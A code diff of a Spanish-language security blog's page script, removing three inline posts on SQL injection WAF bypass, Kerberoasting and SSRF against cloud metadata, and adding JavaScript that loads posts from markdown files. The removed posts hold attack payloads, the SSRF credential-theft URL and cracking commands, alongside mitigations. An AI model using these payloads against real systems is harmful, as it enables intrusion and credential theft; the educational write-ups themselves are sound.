@@ -1870,163 +1870,222 @@
                 }
             });
         });
-        // JAVASCRIPT PARA LA FUNCIONALIDAD DEL BLOG
-// Añade esto en tu sección <script>, después del código existente
+       // JAVASCRIPT PARA CARGAR POSTS DESDE ARCHIVOS .MD
+// Reemplaza el código del blog en tu index.html con este
 
-// Blog posts data - EDITA AQUÍ TUS POSTS
-const blogPosts = [
+// Configuración de posts (metadata)
+const blogPostsConfig = [
     {
-        title: "SQL Injection Avanzado: Bypassing WAF con técnicas alternativas",
-        date: "15 Mayo 2026",
-        readTime: "10 min",
-        tags: ["Web Hacking", "SQL Injection", "WAF Bypass"],
-        excerpt: "Exploro técnicas avanzadas de SQL Injection para evadir firewalls de aplicaciones web modernos, incluyendo ofuscación de payloads y explotación de lógica de negocio.",
-        content: `# SQL Injection Avanzado: Bypassing WAF
-
-## Introducción
-
-Los Web Application Firewalls (WAF) se han convertido en una defensa estándar contra SQL Injection. Sin embargo, existen múltiples técnicas para evadir estas protecciones.
-
-## Técnicas de Ofuscación
-
-### 1. Case Manipulation
-\`\`\`sql
-' UNION SELECT NULL,NULL--
-' uNiOn SeLeCt NULL,NULL--
-\`\`\`
-
-### 2. Comentarios Inline
-\`\`\`sql
-' UNION/**/SELECT/**/NULL,NULL--
-' /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL--
-\`\`\`
-
-### 3. Encoding
-- **URL Encoding**: \`%27%20UNION%20SELECT%20NULL,NULL--\`
-- **Double Encoding**: \`%2527%2520UNION%2520SELECT%2520NULL,NULL--\`
-
-## Time-Based Blind SQLi
-
-Cuando el WAF bloquea respuestas directas:
-
-\`\`\`sql
-' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
-\`\`\`
-
-## Conclusión
-
-La evasión de WAF requiere creatividad y conocimiento profundo de SQL.
-
-> **Disclaimer**: Este contenido es solo educativo.`
+        file: 'blog/sql-injection.md',
+        id: 'sql-injection'
     },
     {
-        title: "Active Directory: Kerberoasting Attack Deep Dive",
-        date: "8 Mayo 2026",
-        readTime: "15 min",
-        tags: ["Active Directory", "Kerberos", "Red Team"],
-        excerpt: "Análisis detallado del ataque Kerberoasting contra Active Directory, desde la enumeración inicial hasta el crackeo offline de tickets TGS.",
-        content: `# Active Directory: Kerberoasting Attack
-
-## ¿Qué es Kerberoasting?
-
-Kerberoasting es una técnica de post-explotación que permite extraer hashes de contraseñas de cuentas de servicio en Active Directory.
-
-## Proceso del Ataque
-
-### 1. Enumeración de SPNs
-
-Usando PowerView:
-\`\`\`powershell
-Get-DomainUser -SPN | select samaccountname,serviceprincipalname
-\`\`\`
-
-### 2. Solicitud de Tickets TGS
-
-\`\`\`powershell
-Add-Type -AssemblyName System.IdentityModel
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken
-\`\`\`
-
-### 3. Cracking Offline
-
-Usando Hashcat:
-\`\`\`bash
-hashcat -m 13100 tickets.txt wordlist.txt --force
-\`\`\`
-
-## Mitigaciones
-
-1. **Contraseñas fuertes** para cuentas de servicio (25+ caracteres)
-2. **Managed Service Accounts** (MSA/gMSA)
-3. **Monitoreo** de solicitudes TGS inusuales
-
-## Detección
-
-Indicadores en Event Logs:
-- Event ID 4769 (TGS Request)
-- Múltiples requests en corto periodo
-- Encryption type 0x17 (RC4)`
+        file: 'blog/kerberoasting.md',
+        id: 'kerberoasting'
     },
     {
-        title: "SSRF to RCE: Explotando APIs Cloud",
-        date: "1 Mayo 2026",
-        readTime: "12 min",
-        tags: ["Web Hacking", "SSRF", "Cloud Security", "AWS"],
-        excerpt: "Cómo convertir una vulnerabilidad SSRF en ejecución remota de código aprovechando metadata services de cloud providers como AWS, Azure y GCP.",
-        content: `# SSRF to RCE: Explotando APIs Cloud
-
-## Server-Side Request Forgery (SSRF)
-
-SSRF permite a un atacante hacer que el servidor realice requests HTTP arbitrarios.
-
-## Metadata Services en Cloud
-
-### AWS IMDSv1
-\`\`\`bash
-http://169.254.169.254/latest/meta-data/
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
-\`\`\`
-
-### Azure Instance Metadata
-\`\`\`bash
-http://169.254.169.254/metadata/instance?api-version=2021-02-01
-\`\`\`
-
-### GCP Metadata
-\`\`\`bash
-http://metadata.google.internal/computeMetadata/v1/
-\`\`\`
-
-## Escalando a RCE
-
-### 1. Obtención de Credenciales IAM
-
-Payload SSRF:
-\`\`\`
-http://vulnerable.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
-\`\`\`
-
-### 2. Abuso de Permisos IAM
-
-Con las credenciales obtenidas:
-\`\`\`bash
-aws s3 ls --profile stolen
-aws lambda list-functions --profile stolen
-\`\`\`
-
-## Mitigaciones
-
-1. **Validar URLs** - Whitelist de dominios
-2. **IMDSv2 obligatorio** en AWS
-3. **Network segmentation**
-4. **Least privilege** en roles IAM
-
-## Conclusión
-
-SSRF en entornos cloud puede ser devastador. Protege tus metadata endpoints.`
+        file: 'blog/ssrf-cloud.md',
+        id: 'ssrf-cloud'
     }
 ];
 
+// Parsear front matter de markdown
+function parseFrontMatter(content) {
+    const frontMatterRegex = /^---\n([\s\S]*?)\n---\n([\s\S]*)$/;
+    const match = content.match(frontMatterRegex);
+    
+    if (!match) {
+        return { metadata: {}, content: content };
+    }
+    
+    const frontMatter = match[1];
+    const markdownContent = match[2];
+    
+    const metadata = {};
+    frontMatter.split('\n').forEach(line => {
+        const colonIndex = line.indexOf(':');
+        if (colonIndex > -1) {
+            const key = line.substring(0, colonIndex).trim();
+            let value = line.substring(colonIndex + 1).trim();
+            
+            // Remover comillas
+            value = value.replace(/^["']|["']$/g, '');
+            
+            // Parsear arrays (tags)
+            if (value.startsWith('[') && value.endsWith(']')) {
+                value = value.slice(1, -1).split(',').map(v => v.trim().replace(/^["']|["']$/g, ''));
+            }
+            
+            metadata[key] = value;
+        }
+    });
+    
+    return { metadata, content: markdownContent };
+}
+
+// Cargar un post desde archivo
+async function loadBlogPost(config) {
+    try {
+        const response = await fetch(config.file);
+        if (!response.ok) {
+            throw new Error(`Failed to load ${config.file}`);
+        }
+        const content = await response.text();
+        const { metadata, content: markdownContent } = parseFrontMatter(content);
+        
+        return {
+            ...metadata,
+            content: markdownContent,
+            id: config.id
+        };
+    } catch (error) {
+        console.error(`Error loading blog post ${config.file}:`, error);
+        return null;
+    }
+}
+
+// Cargar todos los posts
+async function loadAllBlogPosts() {
+    const promises = blogPostsConfig.map(config => loadBlogPost(config));
+    const posts = await Promise.all(promises);
+    return posts.filter(post => post !== null);
+}
+
+// Renderizar tarjetas de blog
+function renderBlogCards(posts) {
+    const blogGrid = document.getElementById('blogGrid');
+    
+    if (!blogGrid) {
+        console.error('Blog grid element not found');
+        return;
+    }
+    
+    blogGrid.innerHTML = ''; // Limpiar
+    
+    posts.forEach((post) => {
+        const blogCard = document.createElement('div');
+        blogCard.className = 'blog-card fade-up';
+        blogCard.innerHTML = `
+            <div class="blog-header">
+                <h3 class="blog-title">${post.title}</h3>
+                <div class="blog-meta">
+                    <span class="blog-date">${post.date}</span>
+                    <span class="blog-read-time">${post.readTime}</span>
+                </div>
+            </div>
+            <div class="blog-body">
+                <p class="blog-excerpt">${post.excerpt}</p>
+                <div class="blog-tags">
+                    ${post.tags.map(tag => `<span class="blog-tag">${tag}</span>`).join('')}
+                </div>
+            </div>
+        `;
+        
+        blogCard.addEventListener('click', () => openBlogModal(post));
+        blogGrid.appendChild(blogCard);
+    });
+}
+
+// Abrir modal con post
+function openBlogModal(post) {
+    const modal = document.getElementById('blogModal');
+    const modalTitle = document.getElementById('modalTitle');
+    const modalDate = document.getElementById('modalDate');
+    const modalReadTime = document.getElementById('modalReadTime');
+    const modalBody = document.getElementById('modalBody');
+
+    if (!modal || !modalTitle || !modalDate || !modalReadTime || !modalBody) {
+        console.error('Modal elements not found');
+        return;
+    }
+
+    modalTitle.textContent = post.title;
+    modalDate.textContent = post.date;
+    modalReadTime.textContent = post.readTime;
+    modalBody.innerHTML = marked.parse(post.content);
+
+    modal.classList.add('active');
+    document.body.style.overflow = 'hidden';
+}
+
+// Cerrar modal
+function closeBlogModal() {
+    const modal = document.getElementById('blogModal');
+    if (modal) {
+        modal.classList.remove('active');
+        document.body.style.overflow = 'auto';
+    }
+}
+
+// Event listeners para cerrar modal
+function setupModalListeners() {
+    const closeButton = document.getElementById('closeModal');
+    const modal = document.getElementById('blogModal');
+    
+    if (closeButton) {
+        closeButton.addEventListener('click', closeBlogModal);
+    }
+    
+    if (modal) {
+        modal.addEventListener('click', (e) => {
+            if (e.target.id === 'blogModal') {
+                closeBlogModal();
+            }
+        });
+    }
+    
+    // ESC key para cerrar
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape') {
+            closeBlogModal();
+        }
+    });
+}
+
+// Inicializar blog cuando la página cargue
+async function initializeBlog() {
+    try {
+        const posts = await loadAllBlogPosts();
+        
+        if (posts.length === 0) {
+            console.warn('No blog posts loaded');
+            const blogGrid = document.getElementById('blogGrid');
+            if (blogGrid) {
+                blogGrid.innerHTML = '<p style="text-align: center; color: var(--text-secondary);">No hay posts disponibles. Asegúrate de estar usando un servidor web.</p>';
+            }
+            return;
+        }
+        
+        renderBlogCards(posts);
+        setupModalListeners();
+        
+        // Activar animaciones fade-up para nuevas tarjetas
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('visible');
+                }
+            });
+        }, {
+            threshold: 0.1,
+            rootMargin: '0px 0px -50px 0px'
+        });
+        
+        document.querySelectorAll('.blog-card').forEach(el => {
+            observer.observe(el);
+        });
+        
+    } catch (error) {
+        console.error('Error initializing blog:', error);
+    }
+}
+
+// Iniciar cuando el DOM esté listo
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initializeBlog);
+} else {
+    initializeBlog();
+}
 // Load blog posts
 function loadBlogPosts() {
     const blogGrid = document.getElementById('blogGrid');
